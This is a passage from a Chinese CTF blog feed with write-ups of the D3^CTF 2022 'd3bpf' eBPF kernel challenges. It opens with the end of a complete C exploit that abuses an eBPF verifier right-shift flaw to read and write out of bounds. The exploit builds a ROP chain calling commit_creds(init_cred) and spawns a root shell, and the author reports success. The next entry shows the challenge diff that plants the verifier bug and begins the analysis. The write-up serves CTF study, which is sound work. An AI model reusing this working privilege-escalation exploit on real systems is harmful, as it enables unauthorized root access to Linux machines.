class="meta">#<span class="meta-keyword">define</span> BPF_MOV64_REG(DST, SRC)              \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                      \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU64 | BPF_MOV | BPF_X, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                      \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                      \</span></span><br><span class="line"><span class="meta">        .off = 0,                            \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_MOV32_REG(DST, SRC)            \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                    \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU | BPF_MOV | BPF_X, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                    \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                    \</span></span><br><span class="line"><span class="meta">        .off = 0,                          \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ALU ops on immediates, bpf_add|sub|...: dst_reg += imm32 */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_ALU64_IMM(OP, DST, IMM)             \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                         \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU64 | BPF_OP(OP) | BPF_K, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                         \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,                           \</span></span><br><span class="line"><span class="meta">        .off = 0,                               \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ALU ops on registers, bpf_add|sub|...: dst_reg += src_reg */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_ALU64_REG(OP, DST, SRC)             \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                         \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU64 | BPF_OP(OP) | BPF_X, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                         \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                         \</span></span><br><span class="line"><span class="meta">        .off = 0,                               \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Program exit */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_EXIT_INSN()             \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;             \</span></span><br><span class="line"><span class="meta">        .code = BPF_JMP | BPF_EXIT, \</span></span><br><span class="line"><span class="meta">        .dst_reg = 0,               \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,               \</span></span><br><span class="line"><span class="meta">        .off = 0,                   \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* BPF_LD_IMM64 macro encodes single &#x27;load 64-bit immediate&#x27; insn */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_LD_IMM64(DST, IMM) \</span></span><br><span class="line"><span class="meta">    BPF_LD_IMM64_RAW(DST, 0, IMM)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* pseudo BPF_LD_IMM64 insn used to refer to process-local map_fd */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_LD_MAP_FD(DST, MAP_FD) \</span></span><br><span class="line"><span class="meta">    BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// varies from userspace bpf_map_info definition so need to redefine</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_info_kernel</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    __u32 type;</span><br><span class="line">    __u32 id;</span><br><span class="line">    __u32 key_size;</span><br><span class="line">    __u32 value_size;</span><br><span class="line">    __u32 max_entries;</span><br><span class="line">    __u32 map_flags;</span><br><span class="line">    <span class="keyword">char</span> name[BPF_OBJ_NAME_LEN];</span><br><span class="line">    __u32 ifindex;</span><br><span class="line">    __u32 btf_vmlinux_value_type_id;</span><br><span class="line">    __u64 netns_dev;</span><br><span class="line">    __u64 netns_ino;</span><br><span class="line">    __u32 btf_id;</span><br><span class="line">    __u32 btf_key_type_id;</span><br><span class="line">    __u32 btf_value_type_id;</span><br><span class="line">&#125; __attribute__((aligned(<span class="number">8</span>)));</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bpf</span><span class="params">(<span class="keyword">int</span> cmd, <span class="keyword">union</span> bpf_attr *attrs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_bpf, cmd, attrs, <span class="keyword">sizeof</span>(*attrs));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">create_map</span><span class="params">(<span class="keyword">union</span> bpf_attr *map_attrs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_CREATE, map_attrs);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">update_map_element</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">uint64_t</span> key, <span class="keyword">void</span> *value, <span class="keyword">uint64_t</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;&#125;;</span><br><span class="line">    attr.map_fd = fd;</span><br><span class="line">    attr.key = (<span class="keyword">uint64_t</span>)&amp;key;</span><br><span class="line">    attr.value = (<span class="keyword">uint64_t</span>)value;</span><br><span class="line">    attr.flags = flags;</span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_UPDATE_ELEM, &amp;attr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lookup_map_element</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">uint64_t</span> key, <span class="keyword">void</span> *value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;&#125;;</span><br><span class="line">    attr.map_fd = fd;</span><br><span class="line">    attr.key = (<span class="keyword">uint64_t</span>)&amp;key;</span><br><span class="line">    attr.value = (<span class="keyword">uint64_t</span>)value;</span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_LOOKUP_ELEM, &amp;attr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">obj_get_info_by_fd</span><span class="params">(<span class="keyword">union</span> bpf_attr *attrs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_OBJ_GET_INFO_BY_FD, attrs);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">map_get_next_key</span><span class="params">(<span class="keyword">union</span> bpf_attr *attrs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_GET_NEXT_KEY, attrs);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">run_bpf_prog</span><span class="params">(struct bpf_insn *insn, <span class="keyword">uint32_t</span> cnt, <span class="keyword">int</span> *prog_fd_out, <span class="keyword">char</span> *write_buf, <span class="keyword">size_t</span> write_nbytes)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">int</span> prog_fd = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">char</span> verifier_log_buff[<span class="number">0x200000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> socks[<span class="number">2</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">prog_attrs</span> =</span></span><br><span class="line">        &#123;</span><br><span class="line">            .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,</span><br><span class="line">            .insn_cnt = cnt,</span><br><span class="line">            .insns = (<span class="keyword">uint64_t</span>)insn,</span><br><span class="line">            .license = (<span class="keyword">uint64_t</span>) <span class="string">&quot;&quot;</span>,</span><br><span class="line">            .log_level = <span class="number">2</span>,</span><br><span class="line">            .log_size = <span class="keyword">sizeof</span>(verifier_log_buff),</span><br><span class="line">            .log_buf = (<span class="keyword">uint64_t</span>)verifier_log_buff&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> != prog_fd_out)</span><br><span class="line">    &#123;</span><br><span class="line">        prog_fd = *prog_fd_out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> &gt;= prog_fd)</span><br><span class="line">    &#123;</span><br><span class="line">        prog_fd = bpf(BPF_PROG_LOAD, &amp;prog_attrs);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> &gt; prog_fd)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(verifier_log_buff);</span><br><span class="line">        <span class="keyword">goto</span> done;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != socketpair(AF_UNIX, SOCK_DGRAM, <span class="number">0</span>, socks))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">goto</span> done;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != setsockopt(socks[<span class="number">0</span>], SOL_SOCKET, SO_ATTACH_BPF, &amp;prog_fd, <span class="keyword">sizeof</span>(<span class="keyword">int</span>)))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">goto</span> done;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (write_nbytes != write(socks[<span class="number">1</span>], write_buf, write_nbytes))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[!] write not so good\n&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> done;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> != prog_fd_out)</span><br><span class="line">    &#123;</span><br><span class="line">        *prog_fd_out = prog_fd;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        close(prog_fd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">done:</span><br><span class="line">    close(socks[<span class="number">0</span>]);</span><br><span class="line">    close(socks[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">err_exit</span><span class="params">(<span class="keyword">char</span> *err_msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(err_msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EXP_REG BPF_REG_8</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> attack()                                    \</span></span><br><span class="line"><span class="meta">    BPF_MOV64_IMM(BPF_REG_9, 64),                   \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(EXP_REG, 1),                  \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_RSH, EXP_REG, BPF_REG_9), \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_0, EXP_REG)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (argc == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">leak_insn</span>[] =</span> &#123;</span><br><span class="line">            attack(),</span><br><span class="line">            BPF_ALU64_IMM(BPF_MUL, EXP_REG, (<span class="number">16</span> - <span class="number">8</span>)),</span><br><span class="line">            BPF_MOV64_IMM(BPF_REG_2, <span class="number">0</span>),</span><br><span class="line">            BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),</span><br><span class="line">            BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, <span class="number">-8</span>),</span><br><span class="line">            BPF_MOV64_IMM(BPF_REG_4, <span class="number">8</span>),</span><br><span class="line">            BPF_ALU64_REG(BPF_ADD, BPF_REG_4, EXP_REG),</span><br><span class="line">            BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_skb_load_bytes),</span><br><span class="line">            BPF_EXIT_INSN()&#125;;</span><br><span class="line">        <span class="keyword">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">        <span class="built_in">memset</span>(buf, <span class="number">0xFF</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0</span> != run_bpf_prog(leak_insn, <span class="keyword">sizeof</span>(leak_insn) / <span class="keyword">sizeof</span>(struct bpf_insn), <span class="literal">NULL</span>, buf, <span class="number">0x100</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            err_exit(<span class="string">&quot;[-] Failed to run bpf program\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (argc == <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        save_status();</span><br><span class="line">        signal(SIGSEGV, &amp;get_shell);</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_offset = strtoul(argv[<span class="number">1</span>], <span class="literal">NULL</span>, <span class="number">16</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] kernel offset: %p\n&quot;</span>, kernel_offset);</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> commit_creds = kernel_offset + <span class="number">0xffffffff810d7210</span>;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> init_cred = kernel_offset + <span class="number">0xffffffff82e6e860</span>;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> pop_rdi_ret = kernel_offset + <span class="number">0xffffffff81097050</span>;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> swapgs_restore_regs_and_return_to_usermode = kernel_offset + <span class="number">0xffffffff81e0100b</span>;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> rop_chain[<span class="number">0x100</span>];</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        rop_chain[i++] = <span class="number">0xDEADBEEF</span>;</span><br><span class="line">        rop_chain[i++] = <span class="number">0xDEADBEEF</span>;</span><br><span class="line">        rop_chain[i++] = pop_rdi_ret;</span><br><span class="line">        rop_chain[i++] = init_cred;</span><br><span class="line">        rop_chain[i++] = commit_creds;</span><br><span class="line">        rop_chain[i++] = swapgs_restore_regs_and_return_to_usermode;</span><br><span class="line">        rop_chain[i++] = <span class="number">0</span>;</span><br><span class="line">        rop_chain[i++] = <span class="number">0</span>;</span><br><span class="line">        rop_chain[i++] = &amp;get_shell;</span><br><span class="line">        rop_chain[i++] = user_cs;</span><br><span class="line">        rop_chain[i++] = user_rflags;</span><br><span class="line">        rop_chain[i++] = user_sp;</span><br><span class="line">        rop_chain[i++] = user_ss;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">attack_insn</span>[] =</span> &#123;</span><br><span class="line">            attack(),</span><br><span class="line">            BPF_ALU64_IMM(BPF_MUL, EXP_REG, (<span class="number">0x100</span> - <span class="number">8</span>)),</span><br><span class="line">            BPF_MOV64_IMM(BPF_REG_2, <span class="number">0</span>),</span><br><span class="line">            BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),</span><br><span class="line">            BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, <span class="number">-8</span>),</span><br><span class="line">            BPF_MOV64_IMM(BPF_REG_4, <span class="number">8</span>),</span><br><span class="line">            BPF_ALU64_REG(BPF_ADD, BPF_REG_4, EXP_REG),</span><br><span class="line">            BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_skb_load_bytes),</span><br><span class="line">            BPF_EXIT_INSN()&#125;;</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0</span> != run_bpf_prog(attack_insn, <span class="keyword">sizeof</span>(attack_insn) / <span class="keyword">sizeof</span>(struct bpf_insn), <span class="literal">NULL</span>, rop_chain, <span class="number">0x100</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            err_exit(<span class="string">&quot;[-] Failed to run bpf program\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230111180153062.png"                      alt="image-20230111180153062"                ></p><p>首先运行exp触发<code>soft panic</code>可以看到在其中存在酷似kernel代码段的地址信息，所以我们可以通过计算得到<code>kernel_offset</code></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230111180450710.png"                      alt="image-20230111180450710"                ></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230111180529651.png"                      alt="image-20230111180529651"                ></p><p>最后成功提权。</p><hr><p>题目放在:<a class="link"   href="https://github.com/196082/196082/blob/main/kernel_pwn/d3bpf-v2.zip" >https://github.com/196082/196082/blob/main/kernel_pwn/d3bpf-v2.zip<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;因为近期一直在玩内核，在把这篇文章写完之后就不会一直更新内核相关的了，后续的打算是学习完逃逸的内容之后就开始进行刷题和复现比赛的练习了。&lt;/p&gt;
&lt;h2 id=&quot;分析题目&quot;&gt;&lt;a href=&quot;#分析题目&quot; class=&quot;headerlink&quot; title=&quot;分析题目&quot;&gt;&lt;/</summary>
      
    
    
    
    <category term="kernel-pwn" scheme="https://cv196082.gitee.io/categories/kernel-pwn/"/>
    
    
    <category term="ebpf" scheme="https://cv196082.gitee.io/tags/ebpf/"/>
    
  </entry>
  
  <entry>
    <title>d3bpf</title>
    <link href="https://cv196082.gitee.io/2023/01/06/d3bpf/"/>
    <id>https://cv196082.gitee.io/2023/01/06/d3bpf/</id>
    <published>2023-01-06T11:55:01.000Z</published>
    <updated>2023-01-06T11:55:39.052Z</updated>
    
    <content type="html"><![CDATA[<p>虽然在之前出过几篇关于bpf的文章，但是我并没有得到很深层次的理解，文章的exp基本就是copy的。并且，D3^CTF 2022还有两道ebpf需要复现，所以现在就选择了复现一下。</p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/fs/fs_context.c b/fs/fs_context.c</span><br><span class="line">index <span class="number">2834</span>d1afa.<span class="number">.0</span>a79c9099 <span class="number">100644</span></span><br><span class="line">--- a/fs/fs_context.c</span><br><span class="line">+++ b/fs/fs_context.c</span><br><span class="line">@@ <span class="number">-530</span>,<span class="number">7</span> +<span class="number">530</span>,<span class="number">7</span> @@ <span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">legacy_parse_param</span><span class="params">(struct fs_context *fc, struct fs_parameter *param)</span></span></span><br><span class="line"><span class="function">       param-&gt;key)</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line">-<span class="keyword">if</span> (len &gt; PAGE_SIZE - <span class="number">2</span> - size)</span><br><span class="line">+<span class="keyword">if</span> (size + len + <span class="number">2</span> &gt; PAGE_SIZE) <span class="comment">// patch for CVE-2022-0185</span></span><br><span class="line"> <span class="keyword">return</span> invalf(fc, <span class="string">&quot;VFS: Legacy: Cumulative options too large&quot;</span>);</span><br><span class="line"> <span class="keyword">if</span> (<span class="built_in">strchr</span>(param-&gt;key, <span class="string">&#x27;,&#x27;</span>) ||</span><br><span class="line">     (param-&gt;type == fs_value_is_string &amp;&amp;</span><br><span class="line">diff --git a/kernel/bpf/verifier.c b/kernel/bpf/verifier.c</span><br><span class="line">index <span class="number">37581919</span>e.<span class="number">.8e98</span>d4af5 <span class="number">100644</span></span><br><span class="line">--- a/kernel/bpf/verifier.c</span><br><span class="line">+++ b/kernel/bpf/verifier.c</span><br><span class="line">@@ <span class="number">-6455</span>,<span class="number">11</span> +<span class="number">6455</span>,<span class="number">11</span> @@ <span class="keyword">static</span> <span class="keyword">int</span> adjust_scalar_min_max_vals(struct bpf_verifier_env *env,</span><br><span class="line"> scalar_min_max_lsh(dst_reg, &amp;src_reg);</span><br><span class="line"> <span class="keyword">break</span>;</span><br><span class="line"> <span class="keyword">case</span> BPF_RSH:</span><br><span class="line">-<span class="keyword">if</span> (umax_val &gt;= insn_bitness) &#123;</span><br><span class="line">-<span class="comment">/* Shifts greater than 31 or 63 are undefined.</span></span><br><span class="line"><span class="comment">- * This includes shifts by a negative number.</span></span><br><span class="line"><span class="comment">- */</span></span><br><span class="line">-mark_reg_unknown(env, regs, insn-&gt;dst_reg);</span><br><span class="line">+<span class="keyword">if</span> (umin_val &gt;= insn_bitness) &#123;</span><br><span class="line">+<span class="keyword">if</span> (alu32)</span><br><span class="line">+__mark_reg32_known(dst_reg, <span class="number">0</span>);</span><br><span class="line">+<span class="keyword">else</span></span><br><span class="line">+__mark_reg_known_zero(dst_reg);</span><br><span class="line"> <span class="keyword">break</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">if</span> (alu32)</span><br><span class="line">diff --git a/net/packet/af_packet.c b/net/packet/af_packet.c</span><br><span class="line">index <span class="number">6b</span>bc7a448..d949fdf00 <span class="number">100644</span></span><br><span class="line">--- a/net/packet/af_packet.c</span><br><span class="line">+++ b/net/packet/af_packet.c</span><br><span class="line">@@ <span class="number">-4448</span>,<span class="number">9</span> +<span class="number">4448</span>,<span class="number">10</span> @@ <span class="keyword">static</span> <span class="keyword">int</span> packet_set_ring(struct sock *sk, <span class="keyword">union</span> tpacket_req_u *req_u,</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> out_free_pg_vec:</span><br><span class="line">-bitmap_free(rx_owner_map);</span><br><span class="line">-<span class="keyword">if</span> (pg_vec)</span><br><span class="line">+<span class="keyword">if</span> (pg_vec) &#123;</span><br><span class="line">+bitmap_free(rx_owner_map); <span class="comment">// patch for CVE-2021-22600</span></span><br><span class="line"> free_pg_vec(pg_vec, order, req-&gt;tp_block_nr);</span><br><span class="line">+&#125;</span><br><span class="line"> out:</span><br><span class="line"> <span class="keyword">return</span> err;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>题目拿到手之后是一个diff文件，在文件最上面有一个patch是为了修复<code>CVE-2022-0185</code>，在文件的最下面是一个patch，也明说了就是为了修复<code>CVE-2021-22600</code>，不过上面还有一段修改。</p><p>上面将原本的语句删除了，并且添加了几条语句。原本的语句中的，在进行RSH时，如果超过31或则63则将寄存器设置为unkown。但是在修改过后的语句中如果超过了63或者31不是设置为unknown而是默认设置为0。</p><p>这里因为架构的原因，如果我们使用右移64位得到的结果为1</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/x 1 &gt;&gt; 64</span><br><span class="line"><span class="variable">$3</span> = 0x1</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>所以题目这里给的漏洞为，在verifier为0但是在runtime为1的寄存器。</p><p>观察题目的启动命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">  -m 128M \</span><br><span class="line">  -kernel bzImage \</span><br><span class="line">  -initrd rootfs.cpio \</span><br><span class="line">  -append <span class="string">&#x27;console=ttyS0 kaslr quiet&#x27;</span> \</span><br><span class="line">  -monitor /dev/null \</span><br><span class="line">  -cpu kvm64,+smep,+smap \</span><br><span class="line">  -smp cores=1,threads=1 \</span><br><span class="line">  -nographic \</span><br><span class="line">  -s</span><br></pre></td></tr></table></figure><p>基本上能开的都开了，启动虚拟机也可以查看，其实kpti也是打开了的。</p><h2 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h2><h3 id="泄漏"><a href="#泄漏" class="headerlink" title="泄漏"></a>泄漏</h3><p>因为我们现在有一个verifier为0，runtime为1的寄存器所以我们可以尝试越界读来造成泄漏，首先就需要认识<code>bpf_map</code>结构体:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span 